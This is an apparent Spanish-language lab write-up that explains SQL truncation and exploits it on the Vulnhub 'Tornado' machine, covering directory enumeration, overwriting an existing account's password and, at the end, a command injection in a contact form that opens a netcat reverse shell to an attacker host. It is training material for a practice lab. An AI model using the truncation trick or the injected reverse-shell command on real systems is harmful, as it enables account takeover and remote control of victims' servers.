# Ataque de Truncado SQL (SQL Truncation)

Tags: #SQLTrunk #OWASP #Explotacion 

El ataque de **truncado SQL**, también conocido como **SQL Truncation**, es una técnica de ataque en la que un atacante intenta **truncar** o **cortar** una consulta SQL para realizar acciones maliciosas en una **base de datos**.

Un ejemplo común de este tipo de ataque es cuando una aplicación web tiene un campo de entrada que limita la longitud de los datos, como el correo electrónico, y no valida adecuadamente los datos de entrada.

Supongamos por ejemplo una página la cual dispone de un campo de registro para crear un nuevo usuario. En este campo de registro, el usuario debe proporcionar una dirección de correo y la contraseña del usuario en cuestión que desea crear. Ahora bien, de cara a la inserción de estos datos en la base de datos, supongamos que el campo correspondiente a la dirección email que introduce el usuario, está limitado a **17 caracteres** en la base de datos.

Suponiendo que por ejemplo el usuario ‘**admin@admin.com**‘ ya existe en la base de datos, de primeras no sería posible registrar este mismo usuario, debido a que la query SQL que se aplicaría por detrás lo consideraría como una entrada duplicada. Sin embargo, dado que el correo ‘**admin@admin.com**‘ tiene un total de **15 caracteres** y todavía no hemos llegado al límite, un atacante lo que podría intentar hacer es registrar al usuario ‘**admin@admin.com  a**‘, o de otra forma para que lo veáis mejor: ‘**admin@admin.com[espacio][espacio]a**‘.

Esta nueva cadena que hemos representado para el correo electrónico, en este caso tiene un total de **18 caracteres**. De primeras el correo es distinto al correo ya existente en la base de datos (admin@admin.com), sin embargo, debido a su limitación en **17 caracteres**, tras pasar el primer filtro y proceder a su inserción en la base de datos, la longitud total de la cadena se acota a los 17 caracteres, resultando en la cadena ‘**admin@admin.com**  ‘, o dicho de otra forma: ‘**admin@admin.com[espacio][espacio]**‘.

Ahora bien, ¿qué pasa con los espacios?, pues dado que no representan “información de valor”, por decirlo de alguna forma, lo que sucederá es que se **truncarán**. A lo que nos referimos con esto del **truncado de los espacios** al final de la cadena, es a la eliminación automática de los mismos. De esta forma, la cadena resultante final se quedaría en ‘**admin@admin.com**‘, consiguiendo tras su inserción en la base de datos cambiar su contraseña a la especificada durante la fase de registro para nuestro supuesto “**nuevo usuario**“.

Este ataque funcionará para casos donde la aplicación web no valide adecuadamente los datos de entrada y corte o trunque la consulta SQL en lugar de mostrar un mensaje de error. En consecuencia, el atacante puede aprovechar esta debilidad para realizar acciones maliciosas en la base de datos, como modificar o eliminar datos, acceder a información confidencial o tomar el control de una cuenta de usuario.

Para prevenir el ataque de truncado SQL, es importante validar adecuadamente todos los datos de entrada de usuario que se utilizan en las consultas SQL. La validación debe incluir tanto la longitud como el formato de los datos de entrada.

A continuación, se os proporciona el enlace directo de descarga a la máquina Tornado de Vulnhub, la cual desplegamos en esta clase para explotar el ataque de truncado SQL:

-   **Máquina Tornado de Vulnhub**: [https://www.vulnhub.com/entry/ia-tornado,639/](https://www.vulnhub.com/entry/ia-tornado,639/)


## SQL Truncation Attack

Para esta lab usaremos la maquina Tornado en donde primero debemos de descubrir rutas de directorios y lo haremos con Gobuster.

```bash
❯ gobuster dir -u http://192.168.68.115/ -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20

	# dir -> Modo enumeracion directory/file
	# u -> Colocamos la url
	# t -> Lanzar peticiones en paralelo al mismo tiempo
	# w -> Ruta del diccionario

❯ gobuster dir -u http://192.168.68.115/bluesky -w /usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php
```

Ahí encontraremos un dir llamado 'bluesky' en el cual enumeraremos por recursos php y ahí encontraremos un panel 'login.php, signup.php'

Podemos hacer un LFI en la pagina web en donde podemos hacer uso de **~tornado/** que es como si hiciéramos **/home/tornado/** y así ingresar a su directorio personal de usuario, esto es gracias a que en la pagina Apache tiene un **alias** configurado de esa manera. 
```bash
❯ http://192.168.68.115/~tornado/

	# tornado = Nombre de la maquina que estamos usando 
	# Encontramos un archivo llamado imp.txt en donde encontramos varios correos 
```

Para el SQL Trunk Attack 
Primero en la parte de registro nos damos cuenta que tenemos un limite de 13 caracteres para el correo. Si colocamos un correo que ya existe, la base de datos no nos dejara registrarnos. 
![](Pasted%20image%2020230522171520.png)
![](Pasted%20image%2020230522170808.png)

Primero debemos de modificar la longitud de la pagina y como ejemplo ponerle 35 en lugar de 13. 
Al momento de volver a meter el usuario que ya existe le agregamos espacios en blanco y un carácter adicional.
![](Pasted%20image%2020230522170925.png)

 Esto hará que la base de datos  trate de crear este usuario, pero como desde un inicio estaba limitado a 13 caracteres, la **base de datos** le borrara los caracteres adicionales como los espacios y la 'a' por lo que lo dejara como estaba al inicio pero con la diferencia de que lo va a '**sobre-registrar o sobre-escribir**' con la passwd nueva que nosotros le asignemos.


Una vez dentro de la pagina en la parte de **Contact** podemos colocar algunos comandos que nos pueden ayudar a entablar una ReverShell a nuestra maquina de atacante. 
![](Pasted%20image%2020230522172159.png)

Nos ponemos en escucha en nuestra maquina de atacante 
```bash 
❯ nc -nlvp 443
```

Colocamos lo siguiente en el comentario de la pagina web. 
```bash
❯ test; nc -e /bin/bash 192.168.68.114 443
```








